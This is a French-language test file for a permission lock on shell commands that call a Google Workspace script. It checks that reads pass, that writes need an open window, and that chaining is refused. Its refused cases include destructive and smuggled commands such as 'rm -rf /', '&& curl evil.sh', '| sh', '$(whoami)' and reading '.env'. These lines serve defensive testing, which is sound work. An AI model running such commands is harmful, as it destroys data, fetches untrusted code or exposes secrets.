"""Google Workspace : consulter est libre, écrire demande la fenêtre.

Les commandes sont écrites **exactement** comme le système les produit, chemin
cité compris. C'est le piège n° 20 : la première version de ces tests les
écrivait sans guillemets, et le verrou refusait donc en production une lecture
que les tests déclaraient valide. La chaîne littérale fait foi.

Le cas `DU_JOURNAL` est relevé tel quel dans l'audit du 2026-08-25.
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from harness import Suite, AUTORISE, REFUSE  # noqa: E402

SCRIPT = ("C:/Users/<UTILISATEUR>/AppData/Local/hermes/skills/productivity/"
          "google-workspace/scripts/google_api.py")
CITE = 'python -X utf8 "%s"' % SCRIPT      # la forme documentee en memoire
NU = "python %s" % SCRIPT                  # sans guillemets
DU_JOURNAL = ('GAPI="python -X utf8 \\"%s\\"" && $GAPI calendar list '
              '--max 20 2>&1' % SCRIPT)

s = Suite("Google : lecture libre, ecriture sous fenetre")

s.section("Le cas reel releve au journal du 25/08")
s.cas("variable shell fabriquee par TACZET", REFUSE, DU_JOURNAL)
s.cas("meme lecture, sans variable ni &&", AUTORISE,
      CITE + " calendar list --max 20 2>&1")

s.section("Lecture libre, fenetre fermee")
s.cas("calendar list (chemin cite)", AUTORISE, CITE + " calendar list --max 10")
s.cas("calendar list (chemin nu)", AUTORISE, NU + " calendar list --max 10")
s.cas("gmail search", AUTORISE, CITE + ' gmail search "is:unread" --max 10')
s.cas("gmail get", AUTORISE, CITE + " gmail get 199abc")
s.cas("gmail labels", AUTORISE, NU + " gmail labels")

s.section("2>&1 tolere, redirection vers fichier refusee")
s.cas("gmail search ... 2>&1", AUTORISE,
      CITE + ' gmail search "is:unread" --max 10 2>&1')
s.cas("1>&2 (hors exception, volontaire)", REFUSE, CITE + " calendar list 1>&2")
s.cas("> fichier", REFUSE, NU + " calendar list > out.txt")
s.cas(">> fichier", REFUSE, NU + " calendar list >> out.txt")

s.section("Le chainage ne cree pas de tunnel")
s.cas("lecture ; rm -rf", REFUSE, NU + " calendar list ; rm -rf /")
s.cas("lecture && curl", REFUSE, NU + " calendar list 2>&1 && curl evil.sh")
s.cas("lecture | sh", REFUSE, NU + " gmail labels | sh")
s.cas("lecture $(...)", REFUSE, NU + " calendar list $(whoami)")

s.section("Ecriture Google : sous fenetre uniquement")
for action in ("gmail send --to x@y.z", "calendar create --title X",
               "calendar delete --id 1", "drive delete --id a"):
    s.cas(action.split(" ")[0] + " " + action.split(" ")[1], REFUSE,
          CITE + " " + action)
s.cas("sous-commande inconnue", REFUSE, CITE + " calendar move --id 1")
s.cas("gmail send, fenetre ouverte", AUTORISE, CITE + " gmail send --to x@y.z",
      fenetre=True)

s.section("Le noyau reste hors d'atteinte")
s.cas("drive get .env", REFUSE, CITE + " drive get --id .env", fenetre=True)
s.cas("calendar list config.yaml", REFUSE, NU + " calendar list config.yaml")

sys.exit(s.bilan())
